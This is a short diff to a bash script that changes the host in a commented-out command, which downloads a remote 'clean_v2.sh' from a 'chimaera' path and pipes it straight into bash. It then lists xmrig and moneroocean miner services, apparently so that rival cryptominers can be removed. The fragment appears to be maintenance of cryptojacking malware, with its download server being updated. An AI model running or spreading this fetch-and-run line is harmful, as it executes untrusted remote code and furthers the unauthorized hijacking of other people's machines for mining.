@@ -1,5 +1,5 @@
 #!/bin/bash
-# wget -O - http://45.9.148.35/chimaera/sh/clean_v2.sh | bash
+# wget -O - http://solscan.live/chimaera/sh/clean_v2.sh | bash
 
 
 ARRAY_SERVICES=("xmrig" "xmrig.service" "moneroocean_miner" "moneroocean_miner.service")
